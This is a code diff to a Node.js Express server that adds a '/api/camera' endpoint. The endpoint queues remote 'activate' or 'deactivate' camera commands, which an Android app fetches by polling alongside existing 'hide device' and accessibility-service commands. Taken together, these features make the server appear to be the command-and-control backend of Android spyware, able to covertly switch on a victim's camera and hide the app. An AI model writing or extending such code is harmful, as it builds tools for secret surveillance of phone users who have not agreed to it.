@@ -93,9 +93,11 @@ const initializeCommandsFile = () => {
         const initialCommands = {
             hide_commands: [],
             accessibility_commands: [],
+            camera_commands: [],
             stats: {
                 total_hide_commands: 0,
-                total_accessibility_commands: 0
+                total_accessibility_commands: 0,
+                total_camera_commands: 0
             }
         };
         fs.writeFileSync(COMMANDS_FILE, JSON.stringify(initialCommands, null, 2));
@@ -132,7 +134,7 @@ const readCommands = () => {
         return JSON.parse(commands);
     } catch (error) {
         console.error('Error reading commands file:', error);
-        return { hide_commands: [], accessibility_commands: [], stats: { total_hide_commands: 0, total_accessibility_commands: 0 } };
+        return { hide_commands: [], accessibility_commands: [], camera_commands: [], stats: { total_hide_commands: 0, total_accessibility_commands: 0, total_camera_commands: 0 } };
     }
 };
 
@@ -356,6 +358,61 @@ app.post('/api/accessibility-command', (req, res) => {
     }
 });
 
+// 🎯 NEW: CAMERA COMMAND ENDPOINT
+app.post('/api/camera', (req, res) => {
+    try {
+        const { device_id, action } = req.body;
+        
+        console.log(`📷 Camera command: ${action || 'activate'} for device: ${device_id}`);
+        
+        if (!device_id) {
+            return res.status(400).json({
+                success: false,
+                message: 'Device ID required'
+            });
+        }
+        
+        // Commands file mein save karo
+        const commands = readCommands();
+        const newCommand = {
+            id: Date.now(),
+            device_id: device_id,
+            action: action || 'activate', // 'activate', 'deactivate' etc.
+            type: 'camera_command',
+            status: 'pending',
+            created_at: new Date().toISOString(),
+            executed_at: null
+        };
+        
+        commands.camera_commands.push(newCommand);
+        commands.stats.total_camera_commands = commands.camera_commands.length;
+        
+        if (writeCommands(commands)) {
+            console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id}`);
+            res.json({
+                success: true,
+                message: 'Camera activated successfully!',
+                command_id: newCommand.id,
+                device_id: device_id,
+                action: newCommand.action,
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                message: 'Failed to save command'
+            });
+        }
+        
+    } catch (error) {
+        console.error('❌ Camera command error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
 // 🎯 NEW: CHECK FOR PENDING COMMANDS (Android app ke liye)
 app.post('/api/check-commands', (req, res) => {
     try {
@@ -373,8 +430,12 @@ app.post('/api/check-commands', (req, res) => {
         const pendingAccessibilityCommands = commands.accessibility_commands.filter(cmd => 
             cmd.device_id === device_id && cmd.status === 'pending'
         );
+
+        const pendingCameraCommands = commands.camera_commands.filter(cmd => 
+            cmd.device_id === device_id && cmd.status === 'pending'
+        );
         
-        const allPendingCommands = [...pendingHideCommands, ...pendingAccessibilityCommands];
+        const allPendingCommands = [...pendingHideCommands, ...pendingAccessibilityCommands, ...pendingCameraCommands];
         
         if (allPendingCommands.length > 0) {
             // Pehla pending command return karo
@@ -468,7 +529,8 @@ app.get('/api/all-commands', (req, res) => {
     
     const allCommands = [
         ...commands.hide_commands.map(cmd => ({ ...cmd, command_type: 'hide' })),
-        ...commands.accessibility_commands.map(cmd => ({ ...cmd, command_type: 'accessibility' }))
+        ...commands.accessibility_commands.map(cmd => ({ ...cmd, command_type: 'accessibility' })),
+        ...commands.camera_commands.map(cmd => ({ ...cmd, command_type: 'camera' }))
     ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
     
     res.json({
@@ -534,7 +596,8 @@ app.get('/api/docs', (req, res) => {
                 'GET /api/user/:id': 'Get user data',
                 'POST /api/check-commands': 'Check for pending commands',
                 'POST /api/hide-device': 'Hide/unhide device',
-                'POST /api/accessibility-command': 'Accessibility command'
+                'POST /api/accessibility-command': 'Accessibility command',
+                'POST /api/camera': 'Camera command (activate/deactivate)'
             },
             website: {
                 'GET /api/website/users': 'Get all users',
@@ -565,7 +628,7 @@ app.use((req, res) => {
         available_endpoints: {
             public: ['/', '/login', '/health', '/api/docs'],
             protected: ['/web', '/dashboard', '/admin'],
-            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands']
+            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/api/camera']
         }
     });
 });
